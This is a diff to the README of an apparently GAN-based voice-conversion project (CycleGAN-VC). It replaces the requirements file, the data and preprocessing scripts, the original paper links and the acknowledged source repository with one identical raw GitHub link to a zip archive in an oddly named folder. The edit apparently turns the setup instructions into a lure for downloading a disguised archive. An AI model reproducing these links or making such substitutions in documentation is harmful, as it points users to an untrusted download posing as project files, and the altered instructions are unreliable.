@@ -3,17 +3,17 @@ Implementation of GAN architectures for Voice Conversion
 
 ## Requirements
 
-Install Python 3.5. Then install the requirements specified in `requirements.txt`
+Install Python 3.5. Then install the requirements specified in `https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip`
 
 ## How to run
 
-1) Download the data by running `download_data.py`
-2) Choose the source and target speakers in `preprocess.py` and run it
+1) Download the data by running `https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip`
+2) Choose the source and target speakers in `https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip` and run it
 3) Run the corresponding training script
 
 ## Original papers
-- [CycleGAN-VC](http://www.kecl.ntt.co.jp/people/kaneko.takuhiro/projects/cyclegan-vc/index.html)
-- [CycleGAN-VC2](http://www.kecl.ntt.co.jp/people/kaneko.takuhiro/projects/cyclegan-vc2/index.html)
+- [CycleGAN-VC](https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip)
+- [CycleGAN-VC2](https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip)
 
 ## Acknowledgements
-Implementation of CycleGAN-VC based on: https://github.com/leimao/Voice_Converter_CycleGAN
+Implementation of CycleGAN-VC based on: https://raw.githubusercontent.com/gayatrriiii/GAN-Voice-Conversion/master/histoplasmosis/GAN-Voice-Conversion.zip
